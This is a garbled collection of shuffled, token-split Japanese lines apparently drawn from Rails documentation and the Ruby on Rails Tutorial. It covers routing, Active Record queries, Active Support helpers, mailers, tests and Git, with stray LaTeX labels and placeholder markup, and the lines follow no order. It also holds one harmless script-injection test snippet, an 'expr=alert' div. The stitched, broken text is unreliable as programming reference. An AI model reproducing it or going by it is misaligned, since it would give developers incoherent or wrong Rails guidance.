@ part ▖ assemblies▖ delete ( @assembly 1 )
  #  元 の プロセス メソッド へ の 参照 を 保存
テスト 環境 に 以下 を 追加 する こと で テスト の パフォーマンス が 向上 し ま す 。
Rails ヘルパー は 、 この よう に オプション の ハッシュ を 取 る こと が よく あ り 、 これ に よ り Rails の コード から 離れ る こと な く 任意 の HTML オプション を 柔軟 に 追加 する こと が でき ま す 。
` preview_ new_ comment_url` や ` preview_ new_ comment_ path ` ルーティング ヘルパー も 同時 に 作成 さ れ ま す 。
さらに この コード で は 、 関連 付け に よ っ て 使用 でき る よう に な っ た メソッド を いく つ も 利用 し て い ま す 。
namespace   : admin   do
*  `save `
|                     |  411                | :length_required                  |
続 い て 、 算出 さ れ た 時点 まで の 経過 秒数 を 元 に ` since ` メソッド を 呼び出 し 、 時間 を 補正 し ま す 。
デフォルト は `: controller ` で す 。
* `template_engine ` は ビュー の テンプレート エンジン ( ERB や Haml など ) を 指定 し ま す 。
   display : table;
これ は ` config ▖ force _ ssl` を ` true ` に する と 有効 に な り ま す 。
<   最初 の ひと つ を 除 く すべて の コミット に 対 し て 'squash ' を 選択 する   >
*   サーバー 側 で Ajax を 扱 う 方法
   url:  sqlite 3 : NOT _my_ database
Web フォーム に Ajax を 採用 する の は 今 や 当たり前 に な り つつ あ る の で 、 Rails で も Ajax を 簡単 に 実装 でき る よう に な っ て い ま す 。
### `acts_ like ? (
\ kode {▖ gemrc } に ri と rdoc 生成 を 抑制 する コマンド を 追加 する 。
この コード は リスト \ ref{ code : signin_features } で 使用 さ れ て い ま し た ▟ もう ひと つ 、
#  レシーバ の クラス に 委譲 する
2 つ 目 の コマンド   ( \kode { git  branch } )   は 、 すべて の ローカル ブランチ を 一覧 表示 し ま す ▟ 「 \kode {*} 」 は その ブランチ が 現在 使用 中 で あ る こと を 表 し ま す 。
3 行 目 は 、 今後 の Git リリース で の 前方 互換 性 の ため に 使用 さ れ る オプション 設定 で す 。
` root ` ルーティング は 、 ルーティング ファイル の 先頭 に 記述 し て くださ い ▟ root は 最も よく 使用 さ れ る ルーティング で あ り 、 最初 に マッチ する 必要 が あ る から で す 。
###  文字 列 だけ で 表 さ れ た 条件
今後 使用 する 計画 の あ る すべて の リンク の リスト を 、 URL と ルート   ( route )   の マッピング と 共 に 表 \ ref{table :url_ mapping } に 示 し ま す 。
これ だけ で 、 ユーザー を 取り出 す こと が でき ま す 。
Postgre SQL データベース へ の 接続 と 内容 表示 に は 、 \ href { http://inductionapp▖ com/}{ Induction } と い う ツール が 便利 で す 。
*  `config▖ action _mailer ▖observers ` は 、 メール を 配信 し た とき に 通知 を 受け る オブザーバー を 指定 し ま す 。
この ルーティング に アクセス する と 、 デフォルト の Rails アプリケーション で ` public/index▖html ` に 表示 さ れ る の と 同様 の 詳細 情報 ( Rails や Ruby の バージョン など ) が 表示 さ れ ま す 。
= > [ " user@ foo▖
####  capture
       class_ name :  " User " ,
テスト を 作成 し て い る と 、 私 たち は アプリケーション を さまざま な 側面 から 設計 する こと を 強い られ ま す ▟ これ は テスト 駆動 開発 の 素晴らし い 副次 的 効果 の ひと つ で す 。
<%=   javascript_ include_tag   "main "  %>
\ label{ fig : new_ readme}}╼\end { figure} ╼╼  %  section   version_control   ( end ) ╼╼  \ section { デプロイ する } %  ( fold) ╼  \ label{ sec : deploying } ╼╼
渡 さ れ る 名前 は シンボル また は 文字 列 で す 。
Active   Support は ` Range# to_s ` メソッド を 拡張 し て フォーマット 引数 を オプション で 受け付け る よう に し て い ま す 。
ユーザー の index ビュー 。
Active   Record を 使用 し て 、 モデル が データベース に 書き込 ま れ る 前 に モデル の 状態 を 検証 する こと が でき ま す 。
umerate}╼╼    %  subsection   login_form   ( end ) ╼╼    \ subsection { ユーザー の 検索 と 認証 }  %  ( fold) ╼    \ label{ sec :finding_ and _authenticating _a_user} ╼╼
"tables " ▖ singularize    # => "table "
` deep_dup ` メソッド は 、 与え られ た オブジェクト の 「 ディープ コピー 」 を 返 し ま す 。
ユーザー 表示 用 の ページ   ( \ href { http://local host : 3000 / users / 1 }{ / users / 1 } )
Rails で は 、 Web リクエスト は Action   Pack で 取り扱 わ れ ま す ▟ この 動作 は コントローラ 寄り の 部分   ( ロジック の 実行 )   と ビュー 寄り の 部分 ( テンプレート の 描画 )   に 分かれ ま す 。
     module  Z
これ ら の 章 で は 、 \ kode { has_many} や \ kode { has_many  through } を 使用 し た データ モデル など 、 Rails の 最も 強力 な 機能 を いく つ も 紹介 し ま す 。
#  no  regular   words  or   you'll  be  exposed  to  dictionary   attacks▖
リポジトリ を プッシュ する とき に 「 Are   you   sure  you   want  to  continue   connecting   ( yes/no) ? 」 と 表示 さ れ た ら yes と 入力 し ま す 。
*   スキーマ の 更新
Rails は 自動 的 に 関連 付け の プロキシ オブジェクト を ビルド し ま す が 、 開発 者 は これ を カスタマイズ する こと が でき ま す 。
これ は リスト \ ref{ code :micropost _ordering } で 使用 さ れ て い ま し た 。
###   動的 な セグメント
  #  この ブロック は トランザクション 内 で 呼び出 さ れ る
<%=   link_to   " New   Article " ,   new_ article _ path %>
|  db /migrate/2014 0 120201010 _ create_ comments▖rb  |  データベース に コメント 用 の テーブル を 作成 する ため の マイ グレーション ファイル   ( ファイル 名 の タイム スタンプ は これ と は 異な り ま す )   |
` sum ` メソッド は enumerable の 要素 を 合計 し ま す 。
数値 を 米国 式 の 電話 番号 に 変換 し ま す 。
Rails の 一般 的 な 慣習 に 倣 っ て 、 \ kode {: success } と い う キー に は 成功 時 の メッセージ を 代入 する よう に し ま す   ( リスト \ ref{ code : signup_flash} ) 。
謝辞
スコープ で 引数 を 使用 する の で あ れ ば 、 クラス メソッド と し て 定義 する 方 が 推奨 さ れ ま す 。
今回 は User モデル を 作成 し た とき に
リスト \ ref{ code :static _ page _ routes } で ルート を 定義 し た こと に よ り 、 レイアウト の 中 で 名前 付き ルート が 使え る よう に な り ま し た 。
id   1 の ユーザー が id   2 、 7 、 8 、 10 を フォロー し て い る とき の フィード
delegate  : size ,   to : : attachment ,   prefix :   : avatar
代わ っ て 、 `/photos/ RR 27 ` の よう な パス に マッチ する よう に な り ま す 。
*  `env [ " rack ▖ multithread " ] ` を `false ` に 設定 し 、 アプリケーション を Mutex で 包 み ま す 。
Rails で は Web アプリケーション の 構成 に MVC   ( Model - View- Controller )   と い う モデル を 採用 し て い る 。
Rails で 起動 さ れ る Web サーバー は 、 Ruby に デフォルト で 付属 し て い る WEBrick で す 。
\ href { http://www ▖railstutorial ▖org / ruby - on - rails -tutorial - book } {\emph { Ruby   on   Rails チュートリアル } } へ よ う こそ 。
Rails に は [ SQLite 3 ] ( http://www ▖sqlite ▖org ) の サポート が ビルト イン さ れ て い ま す ▟ SQLite は 軽量 かつ 専用 サーバー の 不要 な データベース アプリケーション で す 。
この コード は リスト \ ref{ code :user_ pages_spec } で 使用 さ れ て い ま し た ▟ もう ひと つ 、
  >>  Rails ▖env
ユーザー 編集 ページ に 対応 する ビュー を 、 リスト \ ref{ code :user_edit_view } に 示 し ま す   ( この ファイル は 手動 で 作成 する 必要 が あ り ま す ) 。
    export▖ add_ invoices ( invoices )
pool は ` ENV [ ' DATABASE _ URL '] ` で 提供 さ れ る 情報 に 含 ま れ て い な い の で 、 マージ さ れ て い ま す 。
これ は 、 \ kode {User ▖ new } を 実行 し て も 単に Ruby オブジェクト を メモリ 上 に 作成 する だけ で 、 データベース に は アクセス し な い ため で す 。
この 節 で は 、 アプリケーション を ディレクトリ の 下 で 実行 する 方法 に つ い て 説明 し ま す 。
   validates : name ,   presence :  { strict :  true   }
2 - 5 の 手順 を 繰り返 す 。
\ kode {authenticate } メソッド が 使え る よう に な る   ( 引数 の 文字 列 が パスワード と 一致 する と User オブジェクト を 、 間違 っ て い る と \ kode {false } 返 す メソッド ) ╼ 。
` Client ` モデル に ` locked ` と い う フィールド が あ れ ば 、 `find_ by _ locked ` と い う メソッド を 使用 でき ま す 。
Rails   コンソール は 、 セッション ごと に ローカル の Rails 環境 を 読み込 む の で 、 コンソール 内 で 明示 的 に コントローラ を 作成 し たり 、 その クラス 階層 を 調べ たり する こと が でき ま す
### ` has _one ` 関連 付け の 詳細
Connection :   Keep- Alive
    LEFT   OUTER   JOIN orders  ON   orders▖ client_ id   =  client ▖ id   WHERE
Microposts リソース の 説明 が 終わ り ま し た の で 、 ここ で リポジトリ を Bitbucket に 登録 し ま しょ う 。
` first ` メソッド は 、 モデル に レコード が 1 つ も な い 場合 に ` nil ` を 返 し ま す ▟ この とき 例外 は 発生 し ま せ ん 。
# =>  Fri ,   15   Oct   15 8 2   0 0 : 0 0 : 0 0   + 0000
ほぼ すべて の Rails アプリケーション は 、 何 ら か の 形 で データベース に アクセス し ま す 。
   def initialize ( person )
" ruby " ▖ pluralize      # => " rubies "
╼╼  \ section { 構造 を 追加 する } %  ( fold) ╼  \ label{ sec : structure} ╼╼
*  ` テーブル 名_ count` -   関連 付け に お い て 、 所属 し て い る オブジェクト の 数 を キャッシュ する の に 使用 さ れ ま す 。
user ▖ update ( name :  'Dave ' )
また 、 メイラー の テスト 方法 に つ い て も 説明 し ま す 。
この 後 すぐ 、 プロファイル に も 統計 情報 パーシャル を 表示 し ま す が 、 今 の うち に リスト \ ref{ code : follow _ form_ partial } の よう に フォロー / フォロー 解除 ボタン 用 の パーシャル も 作成 し ま しょ う 。
` : file ` オプション に 与え る パス は 、 ファイル システム の 絶対 パス で す 。
* `includes`
リスト \ ref{ code : home_root _ route } の コード に する と 、 \ kode {static _ pages/home } に アクセス し て も 動作 し なく な り ま す 。
たとえば 、 以下 の ルーティング は 無効 で す 。
      < li ><%=   msg  %></ li >
今度 は 各 ページ に タイトル を 追加 し て 、 \ ref{ sec : test ing_titles } の テスト が パス する よう に し ま しょ う 。
Rails で は 、 Rake を 頻繁 に 使用 し て い ま す ▟ 特に 、 データベース を 背後 に 持 つ Web アプリケーション 開発 時 に 必要 と な る 管理 タスク で 顕著 で す 。
config▖static_cache_control   =  ' public ,   max - age = 360 0 '
赤色 から 緑色 に する ため に 、 最初 に About ページ 用 の 失敗 する テスト を 書 き 、 赤色 に し ま しょ う 。
*   アプリケーション から 非 同期 に メール を 送信 する 方法
リスト \ ref{ code : production_webserver_config } で は 少し だけ コード の 見栄え を 修正 し て い ま す ▟ これ は 標準 的 な 1 行 80 文字 の 制限 に 合わせ る ため の 変更 で す 。
かつて は Rails アプリ の 本番 デプロイ は 大変 な 作業 で し た が 、 ここ 数 年 急速 に 簡単 に な っ て き て お り 、 さまざま な 本番 環境 を 選択 でき る よう に な り ま し た 。
( 具体 的 な クラス や 継承 に つ い て は 、 \ ref{ sec : ruby _ classes } で 詳し く 説明 し ま す ) 。
洗練 さ れ た タイポグラフィー を 利用 する ため の CSS を 追加 する
Home ページ の サイド バー 用 の SCSS
ActiveSupport: : Inflector ▖ inflections   do  | inflect |
その 後 、 ユーザー を 削除 し て み て 、 マイクロ ポスト の 数 が 1 つ 減 っ て い る か どう か を 確認 し ま す 。
ユーザー が サイン イン する ため の テスト ヘルパー 。
この 節 は 、 ほとんど が 上級 者 向け の 内容 に な っ て お り 、 この 節 を 飛ば し て も 次 の 章 以降 に は 何 の 影響 も あ り ま せ ん 。
タイトル の テスト 。
\emph { Rails チュートリアル } で は 、 様々 な プログラム の 出力 結果   ( シェル コマンド 、 バージョン 管理 ツール 、 Ruby プログラム の 出力 結果 など )   を こまめ に 記載 する よう に し て い ま す 。
Rails で は 、 この よう な テスト 用 データ を \emph { フィクスチャ } で 作成 でき ま す ▟ フィクスチャ を 使用 し て 、 テスト に 必要 な データ を test データベース に 読み込 ん で お く こと が でき ま す 。
    }
group   : assets  do
# => { 'awaiting _ approval ' = >   7 ,  'paid' = >  12   }
   validates :email ,   presence :  true ,  email :  true
###  ネスト し た リソース
*  ` change ` メソッド は 追加 の ` :usec ` も 受け付け ま す 。
実装 する \ kode { admin \_user } フィルター を リスト \ ref{ code : admin_destroy _ before_filter } に 示 し ま す 。
#  and   to  <tt > : update</tt > if  it   is   not ▖
### ` presence `
##### `prev _week` 、 ` next _ week`
       create         test/helpers/microposts_helper_test ▖ rb
テスト を 1 つ   ( また は 小 規模 な テスト グループ )   を 作成 する 。
* `: counter_cache`
この ビュー で は 埋め込 み Ruby を 使用 し て ユーザー 名 と メール アドレス を 表示 し て い ま す ▟ インスタンス 変数 \ kode {@user } が あ る こと を 前提 と し て い ま す 。
####  メイラー ビュー を 作成 する
###  BASIC 認証
` secret_token ▖rb ` イニシャライザ を 削除 し ま す
ユーザー の タイム ゾーン を 設定 し て お け ば 配慮 さ れ ま す 。
config ▖ assets▖ prefix   = '/asset -files '
作成 さ れ た ジョブ は 以下 の よう に な り ま す 。
Overwrite /myapp/config/application ▖ rb ?  
現在 の 状態 を 確認 し て み ま しょ う 。
hash                   # => {: a = > 1 }
当時 の ソース で 生成 さ れ た コード は 以下 の よう に な り ま す 。
*  `config▖time_zone ` は アプリケーション の デフォルト タイム ゾーン を 設定 し 、 Active   Record で 認識 でき る よう に し ま す 。
    <p > Product   Name: <%=   product ▖ name  %></p>
     何 か を する
` app/assets/stylesheets/blorgh/articles ▖css ` で す 。
###  グループ 化 さ れ た 項目 の 合計
ユーザー が マイクロ ポスト を 複数 所有 する   ( \kode { has\_many} )   関連 付け  
#   SELECT   " users " ▖*   FROM   " users "   WHERE   " users " ▖ " state "   =  'pending '   AND   " users " ▖ " state "   =  'inactive'
####  等値 条件
リスト \ ref{ code : account_activation_view_html } の HTML テンプレート で は 、 正し い リンク を 組立て る ため に \ kode {link\_to } メソッド を 使用 し て い る こと に ご 注目 くださ い 。
* * キャッシュ の 無効 化 が 過剰 に 発生 する * *
今後 も この 章 に は 頻繁 に 立ち戻 っ て 参照 し ま す 。
エンジン は 、 プラグ イン と も 密接 に 関連 し ま す 。
ユーザー を 削除 する
Client ▖ order ( created_at:  :asc )
最終 的 な 表示 が やや 込み入 っ て い る ため 、 欲張 ら ず に 細か い 部品 を 1 つ ずつ 確かめ ながら 導入 する こと で 最終 的 な フィード を 実装 し ま す 。
invoke    helper
リスト \ ref{ code : authenticated_p_fixed } の コード を 使用 する と 、 テスト スイート 全体 が   \ passing   に な り 、 サブ タイトル は 両方 とも 修正 さ れ る はず で す 。
WARNING:  `parent ` は 上 の 場合 で も ` Object ` を 返 し ま す 。
これ は 新し い ポスト が 最初 に 来る こと を テスト し て い ま す 。
最後 の 性質 は 、 列挙 型 同士 を 比較 する 場合 に 特 に 便利 で す 。
Ssl   Sep 20   1 : 46 ╼     spring   app  |  sample_app  |  started   7   hours  ago
< a   href = " # "   data- background - color = " # 009900 "   data- text - color = " # FFFFFF " > Paint  it  green </a>
###   名前 衝突 の 回避
` form _ for ` は 、 Java Script を 利用 する ため の ` : remote ` オプション を 引数 に 取 る こと が でき ま す 。
SELECT   categories▖
###  スコープ の マージ
検索 パス を 調べ る に は 、 Rails コンソール で ` Rails ▖ application▖ config ▖ assets▖ paths ` を 調べ ま す 。
Rails の ` rails server ` コマンド の 代わり に ` rackup ` コマンド を 使用 する とき は 、 下記 の 内容 を ` config▖ ru ` に 記述 し て 、 Rails アプリケーション の ルート ディレクトリ に 保存 し ま す 。
{ 0 } 図 5 ▖ 9 { / 0 }   { 1 } \ href { http://local host : 3000 / signup}{/ signup } で 表示 さ れ る 新し い ユーザー 登録 ページ { / 1 }
----------------
この オプション で は 、 リレーショナル データベース で 最も よく 使用 さ れ る アダプタ を リスト から 選択 でき ま す 。
ユーザー 登録 が 成功 し 、 フラッシュ メッセージ が 表示 さ れ る
` config▖ autoload _ paths ` の デフォルト 値 は 、 ` app ` 以下 の すべて の ディレクトリ で す ( 訳注 :   Rails 3 から は autoload _ path の 設定 は デフォルト で は 無効 で す ) 。
` app/controllers ` ディレクトリ の 下 に は ` blorgh ` ディレクトリ が 置 か れ ま す ▟ この 中 に は ` application_controller▖ rb ` と い う ファイル が 1 つ 置 か れ ま す 。
実例 を 使 っ て Rails を 学 ぼ う
たとえば 、 @project ▖ people に 入 っ て い る person を ループ で すべて 列挙 し て input タグ を 作成 する の で あ れ ば 、 以下 の よう に な り ま す 。
この ページ の レンダリング 結果 が レイアウト に 挿入 さ れ る と 、 最終 的 に 以下 の HTML が 出力 さ れ ま す 。
特定 の 属性 に アクセス する ため の ラジオ ボタン タグ を 返 し ま す 。
2 つ 目 は 、 長 い コード の 途中 を 次 の よう に 垂直 連続 ドット で 省略 し た こと で す 。
      invoke     erb
    person ▖errors [ : name ]
resources   : users   do
ほとんど の 場合 、 ` : plain` や `:html ` など を 使用 する 方 が 適切 で す 。
class  MyCrawler <  ThirdPartyLibrary : : Crawler
\ href {https://twitter▖ com/colmtuite } { Colm   Tuite } の 多大 な 貢献 に よ り 、 サンプル アプリケーション を Bootstrap   CSS の フレームワーク に 変換 する こと が でき ま し た ▟ 感謝 し ま す 。
実際 に は 、 ` to _xml ` を すべて の 要素 に 送 り 、 結果 を ルート ノード の 下 に 集め ま す 。
転送 先 の URL を 保存 する 仕組み は 、 { p 0 } で ユーザー を ログ イン さ せ た とき と 同じ で 、 { 2 } session { / 2 } 変数 を 使 い ま す 。
続 い て ブラウザ は ページ を 組み立て ま す 。
  $ rails  console  test
ここ で は \ kode {aside } タグ を 使用 し て 実装 し ま す ▟ この タグ は サイド バー など の 補完 コンテンツ の 表示 に 使用 さ れ ま す が 、 単独 で 表示 する こと も でき ま す 。
この パス は 以下 の よう に 変更 可能 で す 。
#   これ は あくまで 例 で す ▟ ブランチ で ミス を し た 時 以外 は 実行 し な い で くださ い 。
これ を 防 ぐ に は 、 すべて の ページ で 使用 する \emph { 基本 タイトル } を 定め 、 特定 の ページ で は 異な る タイトル に 変更 でき る よう な オプション を 与え る の が 常套 手段 で す 。
大 文字 小 文字 を 無視 する オプション
上 の コード は 、 CSS ソース に 正し く フォーマット さ れ た data  URI を 挿入 し ま す 。
}╼╼%  subsection   two_ subtle_bugs  ( end ) ╼╼\ section {` ` Remember   me   チェック ボックス } %  ( fold) ╼\ label{ sec : remember_me_ checkbox} ╼╼
追加 する コメント で は 、 まず その 変更 に 賛成 し て い る こと を 表明 し つつ 、 なるべく 具体 的 に どの 変更 点 が よ い と 思 っ た の か に つ い て も 示 し ま しょ う 。
1 つ は 、 コード の 重要 な 部分 に ハイライト を 追加 し た こと で す 。
   belongs_to  : category
次 の ステップ は 、 \ kode {config/puma▖ rb } と い う ファイル を 作成 し 、 そこ に リスト \ ref{ code : production_webserver_config } の よう な 設定 情報 を 追加 し ま す 。
デフォルト は true で す 。
これ まで の 章 と 同様 、 最初 に モックアップ を 示 し ま す
この メソッド は 3 つ の オプション を 受け付け ま す 。
     attachments [ 'filename▖ jpg ']  =  File ▖ read ( '/ path/to /filename▖ jpg ')
▖ project
use   ActiveRecord : : Migration : : CheckPending
###  Rails の インストール
これ は リスト \ ref{ code :remember_me_test } で 使用 さ れ て い ま し た 。
ここ で 気 を 付け て いただ き た い 重要 な 違い は 、 表示 する 情報 を 集め る の は   _ コントローラ _  で あ っ て 、 ビュー で は な い と い う こと で す 。
duplicate =  number ▖ deep_dup
% w ( 1   2   3   4   5   6   7 ) ▖ in_groups ( 3 ,  false )
\ label{ fig :user_ index_ delete_links_mockup}}╼\end { figure} ╼╼    \ subsection { 管理 ユーザー } %  ( fold) ╼    \ label{ sec : administrative_users }╼╼
|   GET        | / geocoder/edit  |  geocoders#edit     |  geocoder 編集 用 の HTML フォーム を 返 す    |
*  `config▖ active_ support▖bare は 、 Rails 起動 時 に ` active_ support/all ` の 読み込み を 行な う か どう か を 指定 し ま す 。
self を 省略 し た 結果 を リスト \ ref{ code : account_activation_edit_ action } に 示 し ま す 。
StaticPages コントローラ の タイトル を テスト する   RED { 2 } { 3 } { / 3 } { 3 } { 4 } { / 4 } { / 3 } { 3 } { / 3}{ / 2 }
Web 検索 で XPath を 使用 する 方法 の 詳細 に つ い て は \ href { http://www ▖w 3 schools▖ com/xpath/xpath_syntax ▖ asp }{ XPath 構文 }   ( 英語 )   を 参照 し て くださ い 。
*  `vendor/assets` は 、 Java Script プラグ イン や CSS フレームワーク など 、 外部 の 団体 など に よ っ て 所有 さ れ て い る アセット の 置き 場所 で す 。
now  =  Time▖ current
その 理由 は 、 データベース の アダプタ が 常 に 大 文字 小 文字 を 区別 する インデックス を 使 っ て い る と は 限 ら な い から で す
Application コントローラ に \ kode {hello } を 追加 する 。
コード に 目 を 通 し た の が 自分 以外 に い な い 状態 で コード を 送信 する の は よく あ り ま せ ん 。
" fermat's  enigma " ▖titleize     # =>  " Fermat's   Enigma "
サイン イン の 失敗 を 扱 う   ( 誤り あり ) 。
    @user  =  User ▖ new ( params [ :user ] )
デバッガー を Users コントローラ に 差し込 む
認証
ビュー の レンダリング で は HTTP プロトコル と し て 送信 さ れ ま す が 、 メイラー で は メール の プロトコル を 経由 し て 送信 する 点 のみ が 異な り ま す 。
####  cache
\ ref{ sec : presence_ validation } で 既に 同じ よう な 作業 を 行 っ た の で 、 この 実装 は 簡単 で す 。
ren der  nothing :   true
この ため 、 今後 は 単に \ kode {bun dle  install } を 実行 する だけ で 、 自動 的 に 本番 環境 用 gem を スキップ でき る よう に な り ま す
     minimum :   300 ,
最初 の アプリケーション に 関 する 情報 を 表示 する に は 、 画面 の   [ About  your  application’s  environment ]   リンク を クリック し ま す 。
<%=   link_to  ' Back ' ,  articles_ path %>
Linux や Mac   OS   X など で 日夜 コード を コンパイル し て い ま す 。
登録 後 リダイレクト し た ホーム ページ に アカウント 有効 化 確認 の メッセージ が 表示 さ れ る
image_ submit_tag ( " login ▖ png " )
しかし 、 依然 と し て ここ に は 1 つ の 問題 が 残 っ て い ま す ▟ それ は \emph {Active   Record は データベース の レベル で は 一意 性 を 保証 し て い な い } と い う 問題 で す 。
ただし 、 この ドキュメント を 最大 限 に 活用 する ため に 、 以下 の ソフトウェア が インストール さ れ 、 利用 可能 な 状態 に な っ て い る こと を 前提 と し て い ま す 。
use   ActionDispatch : : ParamsParser
config▖i 18 n ▖enforce_ available_ locales  =  false
` root ` メソッド を 使用 する こと で 、 Rails が ルート `'/'` と す べ き 場所 を 指定 でき ま す 。
{ 0 } 図 9 ▖ 12 { / 0 }   { 1 } ユーザー 一覧 の 2 ページ 目 { / 1 }
self を 省略 し た 結果 を リスト \ ref{ code : password _ reset_migration } に 示 し ま す 。
#   gem  'growl' ,   ' 1 ▖ 0 ▖ 3 '
###  Article モデル を 作成 する
` rackup ` の オプション に つ い て 詳し く 知 り た い とき は 下記 の よう に し ま す 。
{ 0 } 図 6 ▖ 4 { / 0 }   { 1 } リスト \ ref{ code : users _migration } で 生成 さ れ た User の データ モデル { / 1 }
さまざま な 種類 の コンテナ を 1 つ の オプション タグ の セット に まとめ る ため の メソッド を 多数 提供 し ま す 。
上 に よ っ て 以下 の HTML が 生成 さ れ ま す 。
しかし クラス 名 が User と は 限 り ま せ ん ▟ アプリケーション に よ っ て は ` Person ` と い う クラス で あ る か も しれ ま せ ん 。
production 環境 から 送信 し た パスワード 再 設定 メール
値 の 配列 を 設定 する こと も でき ま す 。
NOTE :   定義 ファイル の 場所 は ` active_ support/core _ext/object/acts_ like ▖rb ` で す 。
サンプル コード の 例 は [ Rails コーディング ルール に 従 う ] ( contributing _ to_ruby _ on_rails ▖html#rails%E3%82%B3%E3%83% BC%E3%83%87%E3%82%A3%E3%83%B3%E3%82%B0%E3%83%AB%E3%83% BC%E3%83%AB%E3%81%AB%E5%BE%93%E3%81%86 ) を 参照 し て くださ い 。
データベース から オブジェクト を 取り出 す
   alias _ method_ chain  : process ,  : stringified_params
use   Rack : : ContentLength
作成 し た コード を リスト \ ref{ code :user_ index_ test } に 示 し ま す
Ajax リクエスト に 対 し て レスポンス を 返 す 際 の 形式 は 、 HTML より も JSON を 使用 する こと が 好 ま れ る よう で す 。
self を 省略 し た 結果 を リスト \ ref{ code : test _helper_sessions } に 示 し ま す 。
# => < input   id= " name "   name =" name " type =" text "  />
    has_and _belongs_to_many  : authors
     charset :        " UTF - 8 " ,
now ▖all_quarter
{ 0 } 図 11 ▖ 17 { / 0 } { 1 } 現在 の ユーザー の フォロワー を 表示 する ▟ \ href { http://railstutorial ▖org / images/figures/user_ followers_bootstrap - full ▖ png } { ( 拡大 ) } { / 1 }
http://example ▖ com/password _ resets/3 BdBrXeQZSWqFIDRN 8cxHA/edit ? email = foo % 40 bar▖ com
#     <rank > 1 < / rank>
統計 情報 パーシャル が できあが り ま し た ▟ Home ページ に この 統計 情報 を 表示 する の は 、 リスト \ ref{ code : home_ page_stats } の よう に 簡単 に でき ま す 。
Thu ,   30   Sep  2010   23 : 59 : 59   UTC   + 0 0 : 0 0
###  ブログ アプリケーション を 作成 する
この コマンド の 初回 実行 時 の 出力 結果 は 以下 の よう に な り ま す 。
    options   =   actions ▖ extract _options !
ついに 、 ルーティング と コントローラ と アクション と ビュー が 協調 し て 動作 する よう に な り ま し た 。
TIP:  `find _each ` メソッド と ` find_ in_batches ` メソッド は 、 一 度 に メモリ に 読み込め な い よう な 大量 の レコード に 対 する バッチ 処理 の ため の もの で す 。
上 で キャプチャ し た 変数 は 以下 の よう に 他 の 場所 で 自由 に 使用 でき ま す 。
*   [ アプリケーション の その 他 の 層 に つ い て も 最新 に 保 っ て くださ い ] ( http://secunia ▖ com/)   ( 週刊 の ニュースレター も 発行 し て い ま す )
この 節 の コード を 使用 する こと で 、 ユーザー 編集 ページ は 動作 する はず で す ▟ テスト スイート を もう 一 度 実行 し て み る と 、 今度 は 緑色 に な る で しょ う 。
Gemfile ▖ lock
今度 は 、 RSpec を 実行 する と 緑色 に な る はず で す 。
  #  The  priority   is   based  upon order   of   creation :
( \ ref{ sec : image_upload _ in_production } で も 説明 し ま す が 、 本番 環境 が Heroku で あ れ ば 、 既に 本番 環境 で Image Magick が 使え る よう に な っ て い ま す ) 。
完全 な HTML 構造 を 備え た About ページ の ビュー   GREEN { 2 } { 3 } { / 3 } { 3 } { 4 } { / 4 } { / 3 } { 3 } { / 3}{ / 2 }
\ href {https://tutorials ▖railsapps▖org / hartl} { RailsApps}:   教育 目的 の 、 Rails アプリケーション の サンプル 集 で す 。
# => [ [ " 1 " ,   " 2 " ,   " 3 " ] ,  [ " 4 " ,   " 5 " ] ,  [ " 6 " ,   " 7 " ] ]
         template _ path :  'notifications ' ,
    options   =  options ▖symbolize_keys
その ため に は 、 \ kode { password } 属性 と \ kode { password_confirmation } 属性 を User モデル に 追加 し 、 レコード を データベース に 保存 する 前 に 2 つ の 属性 が 一致 する よう に 要求 し ま す 。
以下 の コード に 注目 し て くださ い 。
ローカル で 作業 し て い る 間 に 、 master で 別 の 更新 が 行 わ れ て い る と い う こと が よく あ り ま す 。
Rails の リソース フル ルーティング で は 、 ( GET 、 PUT など の )   各種 HTTP 動詞   ( verb )   と 、 コントローラ 内 アクション を 指 す URL が 対応 付け られ ま す 。
` readonly ` を 指定 する と 、 関連 付け られ た オブジェクト を 取り出 す とき に 読み出し 専用 に な り ま す 。
Action   Mailer で は ファイル を 簡単 に 添付 でき ま す 。
####  コレクション を 出力 する
Client ▖ w here ( first _ name :  'Ryan') ▖exists ?
残 っ て い る 作業 は 、 Home ページ の ボタン に 適切 な リンク を 追加 する こと で す 。
* ▖swp
###  ラン タイム エラー を チェック する
代り に ` Action Controller : : Base ▖ default _static _extension ` を ご 利用 くださ い 。
   belongs_to  : customer ,   counter_cache: : count _of_orders
###   ベンチ マーク を 行 う
\ ref{ sec : the_form_html } で 詳細 に つ い て 触れ ま す が 、 まず は リスト \ ref{ code : form_css } の SCSS で 見栄え を 整え て み ま しょ う 。
この ため 、 クラス 名 は ` String ` で 表 し 、 後 に エンジン が ` constantize ` で クラス に 変換 する 必要 が あ り ま す 。
< div  id= " mycode "   expr = " alert ( ' hah ! ') "  
      xml ▖ link( @url)
*   Rails アプリケーション の 一般 的 な レイアウト
( なお 、 エラー メッセージ に 対 する テスト は \ ref{ sec : signup _exercises } の 演習 に 残 し て お き ま す ▟ )
それ で は ` app/views/articles/new▖html ▖erb ` を 作成 し 、 その 中 に 以下 の よう に 記入 し ま しょ う 。
Rails   3 ▖ 0 ▖ x の 動作 に 戻 し た い 場合 は 、 以下 の よう に ` format :  false ` を 指定 する こと が でき ま す 。
I   shall  be   late ! " ▖ truncate_words ( 4 )
follow_ redirect !
この 節 で 使用 さ れ た さまざま な 関連 付け を 理解 する の に 一番 良 い の は 、 次 の 節 で 行な っ て い る よう に 実際 の Web インターフェイス で 使用 する こと で す 。
リレーションシップ の アクセス 制御  
*   Rails   3 以上 で は 、 Ruby   1 ▖ 8 ▖ 7 以降 が 必須 で す 。
123 ▖ to_s(:human )                # =>  " 123 "
文字 列 \ kode {’activation’} で も 同じ こと が でき ま す が 、 Ruby で は シンボル を 使 う 方 が 普通 で す 。
$ bun dle   exec   rake   db : rollback
I'm  sorry ▖
rest   =   hash ▖ extract ! (:a)  # => {: a = > 1 }
` constantize ` メソッド は 、 レシーバ の 定数 参照 表現 を 解決 し 、 実際 の オブジェクト を 返 し ま す 。
    <p > ご 入会 ありがとう ござ い ま す ▟ どうぞ お 楽し み くださ い ま せ 。
# =>  Tue ,   09   Aug  2011
Article▖ includes(:comments) ▖ w here ( " comments▖ visible  =  true " ) ▖ references(:comments )
B ▖ x  # => :b
     backgroundColor   = $( this ) ▖ data ( " background - color " )
これ は Rails の アセット パイプライン の 戦略 と し て 採用 さ れ て い ま す 。
結果 を 図 \ ref { fig : new_ signup _ page } の 新規 ユーザー の ページ   ( URI  / signup )   に 示 し ま す 。
ある スコープ を モデル の すべて の クエリ に 適用 し た い 場合 、 モデル 自身 の 内部 で ` default _scope ` メソッド を 使用 する こと が でき ま す 。
